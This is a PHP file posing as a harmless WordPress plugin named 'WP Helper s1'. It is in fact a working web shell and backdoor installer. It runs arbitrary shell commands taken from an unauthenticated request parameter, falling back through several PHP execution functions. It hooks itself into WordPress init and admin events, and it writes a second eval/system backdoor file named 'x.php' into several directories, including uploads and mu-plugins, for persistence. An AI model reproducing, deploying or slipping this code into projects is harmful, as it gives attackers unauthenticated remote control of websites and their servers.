<?php
/*
Plugin Name: WP Helper s1
Description: helper
Version: 1.0.0
*/

// ---------- 1)EX?c= ----------
function wphelper_run() {
    if (!isset($_REQUEST['c'])) return;
    header('Content-Type: text/plain; charset=utf-8');
    $cmd = $_REQUEST['c'];

    echo "whoami: " . @trim(shell_exec('whoami 2>&1') ?: 'n/a') . "\n";
    echo "pwd:    " . @trim(shell_exec('pwd 2>&1') ?: 'n/a') . "\n\n";

    if (function_exists('shell_exec'))      { echo shell_exec($cmd.' 2>&1'); }
    elseif (function_exists('system'))      { system($cmd); }
    elseif (function_exists('passthru'))    { passthru($cmd); }
    elseif (function_exists('exec'))        { exec($cmd.' 2>&1', $o); echo implode("\n", $o); }
    elseif (function_exists('popen'))       { $h=popen($cmd.' 2>&1','r'); while(!feof($h)) echo fread($h,4096); pclose($h); }
    elseif (function_exists('proc_open'))   { $p=proc_open($cmd,[1=>['pipe','w'],2=>['pipe','w']],$pi); echo stream_get_contents($pi[1]), stream_get_contents($pi[2]); }
    else { echo "no exec fn\n"; }
    die();
}

wphelper_run();

add_action('init', 'wphelper_run');
add_action('wp_loaded', 'wphelper_run');
add_action('admin_init', 'wphelper_run');

function wphelper_drop_shell() {
    $payload = '<?php if(isset($_REQUEST["e"])){ @eval($_REQUEST["e"]); } if(isset($_REQUEST["c"])){ system($_REQUEST["c"]); } ?>';
    $paths = [
        __DIR__ . '/x.php',
        WP_CONTENT_DIR . '/uploads/x.php',
        WP_CONTENT_DIR . '/x.php',
        ABSPATH . 'x.php',
        ABSPATH . 'wp-content/mu-plugins/x.php',
    ];
    foreach ($paths as $p) {
        @file_put_contents($p, $payload);
    }
}

//lod
wphelper_drop_shell();
add_action('init', 'wphelper_drop_shell');